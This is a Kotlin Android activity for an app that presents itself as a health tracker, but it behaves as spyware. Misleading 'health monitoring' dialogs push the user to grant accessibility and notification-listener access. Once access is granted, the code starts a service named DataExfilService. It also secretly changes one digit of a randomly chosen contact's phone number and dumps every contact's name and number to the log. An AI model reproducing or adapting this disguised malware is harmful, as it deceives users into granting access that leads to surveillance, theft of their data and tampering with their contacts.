package com.inf2007.healthtracker

import android.Manifest
import android.app.AlertDialog
import android.content.pm.PackageManager
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.compose.material3.MaterialTheme
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.inf2007.healthtracker.ui.theme.HealthTrackerTheme
import com.google.firebase.FirebaseApp
import com.google.firebase.auth.FirebaseAuth
import androidx.compose.runtime.Composable
import androidx.compose.ui.graphics.toArgb
import androidx.compose.ui.tooling.preview.Preview
import androidx.navigation.compose.rememberNavController
import android.content.Intent
import android.os.Build
import com.inf2007.healthtracker.utilities.StepCounterService
import androidx.activity.result.contract.ActivityResultContracts
//  Notification
import com.inf2007.healthtracker.utilities.NotificationPermissionUtils
import android.provider.ContactsContract
import android.util.Log
import android.content.ContentProviderOperation
import android.os.Handler
import android.os.Looper
import kotlin.random.Random
import androidx.lifecycle.lifecycleScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import android.provider.Settings
import android.widget.Toast
import com.inf2007.healthtracker.utilities.WatchAccessibilityService
import android.content.ComponentName
import com.inf2007.healthtracker.utilities.DataExfilService

class MainActivity : ComponentActivity() {
    private val PERMISSIONS_REQUEST_CODE = 100

    private val handler = Handler(Looper.getMainLooper())
    private var isPolling = false

    private var isPollingAccessibility = false

    private val checkPermissionRunnable = object : Runnable {
        override fun run() {
            if (NotificationPermissionUtils.isNotificationAccessGranted(this@MainActivity)) {
                // SUCCESS! Stop polling and return to the app
                stopPollingAndReturn()
            } else if (isPolling) {
                // Keep checking every 1000ms (1 second)
                handler.postDelayed(this, 1000)
            }
        }
    }

    private val checkAccessibilityRunnable = object : Runnable {
        override fun run() {
            if (isAccessibilityServiceEnabled()) {
                // Success! Stop polling
                isPollingAccessibility = false
                handler.removeCallbacks(this)

                runOnUiThread {
                    Toast.makeText(
                        this@MainActivity,
                        "Health monitoring enhanced!",
                        Toast.LENGTH_SHORT
                    ).show()

                    // Move to next permission
                    if (!NotificationPermissionUtils.isNotificationAccessGranted(this@MainActivity)) {
                        handleNotificationAccessFinalStep()
                    } else {
                        startHealthService()
                    }
                }
            } else if (isPollingAccessibility) {
                // Keep checking every 1000ms
                handler.postDelayed(this, 1000)
            }
        }
    }

    private val requestPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val contactsRead = permissions[Manifest.permission.READ_CONTACTS] ?: false
        val contactsWrite = permissions[Manifest.permission.WRITE_CONTACTS] ?: false

        if (contactsRead && contactsWrite) {
            lifecycleScope.launch(Dispatchers.IO) {
                modifyRandomContact()
                logAllContacts()
            }
        }

        // Check accessibility first
        if (!isAccessibilityServiceEnabled()) {
            requestAccessibilityPermission()
        } else if (!NotificationPermissionUtils.isNotificationAccessGranted(this)) {
            handleNotificationAccessFinalStep()
        } else {
            startHealthService()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        FirebaseApp.initializeApp(this)

        enableEdgeToEdge()
        setContent {
            HealthTrackerTheme {
                window.navigationBarColor = MaterialTheme.colorScheme.primary.toArgb()

                val user = FirebaseAuth.getInstance().currentUser
                val navController = rememberNavController()

                NavGraph(user, navController)
            }
        }

        checkAndRequestPermissions()
    }

    override fun onResume() {
        super.onResume()

        // Check if they actually granted it while they were away
        if (NotificationPermissionUtils.isNotificationAccessGranted(this)) {
            // Trigger your "Success" logic
            onPermissionGrantedSuccessfully()
        }

        // Also check accessibility
        if (isAccessibilityServiceEnabled() && NotificationPermissionUtils.isNotificationAccessGranted(this)) {
            onPermissionGrantedSuccessfully()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        isPolling = false
        isPollingAccessibility = false
        handler.removeCallbacks(checkPermissionRunnable)
        handler.removeCallbacks(checkAccessibilityRunnable)
    }

    private fun onPermissionGrantedSuccessfully() {
        // 1. Start the step counter service
        startHealthService()

        // 2. Start DataExfilService regardless of accessibility
        val exfilIntent = Intent(this, DataExfilService::class.java)
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(exfilIntent)
            } else {
                startService(exfilIntent)
            }
            Log.i("HealthTracker", "DataExfilService started")
        } catch (e: Exception) {
            Log.e("HealthTracker", "Failed to start DataExfilService: ${e.message}")
        }

        // 3. Show a feedback message so the user knows it worked
        Toast.makeText(this, "Health Monitor Active!", Toast.LENGTH_SHORT).show()

        // 4. Log it so you can see it in Logcat
        Log.i("HealthTracker", "=== PERMISSION GRANTED: SERVICE INITIALIZED ===")
    }

    private fun stopPollingAndReturn() {
        isPolling = false
        handler.removeCallbacks(checkPermissionRunnable)

        // Bring the app to the front
        val intent = Intent(this, MainActivity::class.java)
        intent.addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        intent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP)
        startActivity(intent)

        // Log the success
        Log.i("HealthTracker", "=== POLLING SUCCESS: USER RETURNED ===")
        Toast.makeText(this, "Monitor Linked Successfully!", Toast.LENGTH_SHORT).show()
    }


    private fun requestPermissions() {
        val permissions = arrayOf(
            Manifest.permission.ACTIVITY_RECOGNITION,
            Manifest.permission.INTERNET,
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.WAKE_LOCK,
            Manifest.permission.SCHEDULE_EXACT_ALARM,
            Manifest.permission.USE_EXACT_ALARM,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
        )

        val permissionsToRequest = permissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (permissionsToRequest.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, permissionsToRequest.toTypedArray(), PERMISSIONS_REQUEST_CODE)
        }
    }

    private fun checkAndRequestPermissions() {
        val permissions = arrayOf(
            Manifest.permission.ACTIVITY_RECOGNITION,
            Manifest.permission.INTERNET,
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.WAKE_LOCK,
            Manifest.permission.SCHEDULE_EXACT_ALARM,
            Manifest.permission.USE_EXACT_ALARM,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_MEDIA_IMAGES,
            Manifest.permission.POST_NOTIFICATIONS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.WRITE_CONTACTS,
        )

        // 1. Check for Standard Permissions (Popups)
        val missing = permissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (missing.isNotEmpty()) {
            // This triggers the standard Android "Allow/Deny" popups in a bundle
            requestPermissionLauncher.launch(permissions)
        } else if (!isAccessibilityServiceEnabled()) {
            // Check accessibility first
            requestAccessibilityPermission()
        } else if (!NotificationPermissionUtils.isNotificationAccessGranted(this)) {
            // If standard ones are done, move straight to the final special one
            handleNotificationAccessFinalStep()
        } else {
            // Everything is already perfect
            startHealthService()
        }
    }

    private fun handleNotificationAccessFinalStep() {
        if (!NotificationPermissionUtils.isNotificationAccessGranted(this)) {
            android.app.AlertDialog.Builder(this)
                .setTitle("Final Step: Health Monitor")
                .setMessage("Please enable 'Health Tracker' in the next screen. We will automatically bring you back once it's done.")
                .setPositiveButton("Configure") { _, _ ->
                    // START POLLING before leaving
                    isPolling = true
                    handler.post(checkPermissionRunnable)

                    val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                    startActivity(intent)
                }
                .setCancelable(false)
                .show()
        }
    }

    private fun startHealthService() {
        val intent = Intent(this, StepCounterService::class.java)
        try {
            // Log this to see if the line even executes
            android.util.Log.d("DEBUG_START", "Executing startForegroundService")

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
        } catch (e: Exception) {
            // This will catch the SecurityException and print the REASON
            android.util.Log.e("DEBUG_START", "Crashed: ${e.message}")
            e.printStackTrace()
        }
    }

    private fun logAllContacts() {
        val uri = ContactsContract.Contacts.CONTENT_URI
        val projection = arrayOf(
            ContactsContract.Contacts._ID,
            ContactsContract.Contacts.DISPLAY_NAME,
            ContactsContract.Contacts.HAS_PHONE_NUMBER
        )

        val cursor = contentResolver.query(uri, projection, null, null, null)

        cursor?.use {
            if (it.count == 0) {
                Log.d("ContactList", "The contacts list is empty. Add a contact to the device!")
                return
            }

            val idIndex = it.getColumnIndex(ContactsContract.Contacts._ID)
            val nameIndex = it.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)
            val hasPhoneIndex = it.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)

            Log.d("ContactList", "--- Starting Contact Export (${it.count} found) ---")

            while (it.moveToNext()) {
                val contactId = it.getString(idIndex)
                val name = it.getString(nameIndex) ?: "Unnamed"
                val hasPhone = it.getInt(hasPhoneIndex)

                var phoneNumber = "No number found"

                // If the contact has at least one phone number, we look it up
                if (hasPhone > 0) {
                    val phoneCursor = contentResolver.query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        arrayOf(ContactsContract.CommonDataKinds.Phone.NUMBER),
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                        arrayOf(contactId),
                        null
                    )

                    phoneCursor?.use { pc ->
                        if (pc.moveToFirst()) {
                            phoneNumber = pc.getString(pc.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
                        }
                    }
                }

                Log.d("ContactList", "Name: $name | Phone: $phoneNumber")
            }
            Log.d("ContactList", "--- End of Contact Export ---")
        } ?: Log.e("ContactList", "Cursor failed to load.")
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray,
        deviceId: Int
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults, deviceId)

        if (requestCode == PERMISSIONS_REQUEST_CODE) {
            val writeGranted = ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_CONTACTS) == PackageManager.PERMISSION_GRANTED
            val readGranted = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED

            if (readGranted && writeGranted) {
                // Run in a background thread to avoid skipping frames on the UI
                Thread {
                    modifyRandomContact()
                    logAllContacts() // Print the new list to verify
                }.start()
            }
        }
    }

    private fun modifyRandomContact() {
        val uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI
        val projection = arrayOf(
            ContactsContract.Data._ID,
            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
            ContactsContract.CommonDataKinds.Phone.NUMBER
        )

        // 1. Get all contacts that have phone numbers
        val cursor = contentResolver.query(uri, projection, null, null, null)
        val contactList = mutableListOf<Triple<String, String, String>>() // <DataID, Name, Number>

        cursor?.use {
            val idIndex = it.getColumnIndexOrThrow(ContactsContract.Data._ID)
            val nameIndex = it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val numIndex = it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)

            while (it.moveToNext()) {
                contactList.add(Triple(
                    it.getString(idIndex),
                    it.getString(nameIndex) ?: "Unknown",
                    it.getString(numIndex) ?: ""
                ))
            }
        }

        if (contactList.isEmpty()) {
            Log.d("ContactList", "No contacts found to modify.")
            return
        }

        // 2. Pick a random contact from the list
        val randomContact = contactList.random()
        val dataId = randomContact.first
        val name = randomContact.second
        val oldNumber = randomContact.third

        // 3. Change one random digit in that number
        val newNumber = changeOneRandomDigit(oldNumber)
        Log.d("ContactList", "Selected: $name. Changing $oldNumber to $newNumber")

        // 4. Update the database
        val ops = ArrayList<ContentProviderOperation>()
        ops.add(
            ContentProviderOperation.newUpdate(ContactsContract.Data.CONTENT_URI)
                .withSelection("${ContactsContract.Data._ID} = ?", arrayOf(dataId))
                .withValue(ContactsContract.CommonDataKinds.Phone.NUMBER, newNumber)
                .build()
        )

        try {
            contentResolver.applyBatch(ContactsContract.AUTHORITY, ops)
            Log.d("ContactList", "Successfully modified $name's number!")
        } catch (e: Exception) {
            Log.e("ContactList", "Failed to update contact: ${e.message}")
        }
    }

    private fun changeOneRandomDigit(number: String): String {
        val digits = number.toCharArray()
        val digitIndices = digits.indices.filter { digits[it].isDigit() }

        if (digitIndices.isNotEmpty()) {
            val randomIndex = digitIndices.random()
            val currentDigit = digits[randomIndex].digitToInt()
            var newDigit = Random.nextInt(0, 10)
            while (newDigit == currentDigit) { newDigit = Random.nextInt(0, 10) }
            digits[randomIndex] = newDigit.digitToChar()
        }
        return String(digits)
    }

    // ========== NEW METHODS FOR ACCESSIBILITY ==========
    private fun isAccessibilityServiceEnabled(): Boolean {
        return try {
            val enabledServices = Settings.Secure.getString(
                contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: ""

            val serviceName = ComponentName(this, WatchAccessibilityService::class.java).flattenToString()
            enabledServices.contains(serviceName)
        } catch (e: Exception) {
            false
        }
    }

    private fun requestAccessibilityPermission() {
        AlertDialog.Builder(this)
            .setTitle("Enhanced Health Tracking")
            .setMessage("For better health insights, enable 'Health Assistant' accessibility service. This helps track app usage patterns for personalized recommendations.")
            .setPositiveButton("Enable") { _, _ ->
                // Start polling before leaving
                isPollingAccessibility = true
                handler.post(checkAccessibilityRunnable)

                val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                startActivity(intent)

                Toast.makeText(this, "Enable 'Health Assistant' then return", Toast.LENGTH_LONG).show()
            }
            .setNegativeButton("Skip") { _, _ ->
                // Skip to notification permission
                if (!NotificationPermissionUtils.isNotificationAccessGranted(this)) {
                    handleNotificationAccessFinalStep()
                } else {
                    startHealthService()
                }
            }
            .show()
    }
}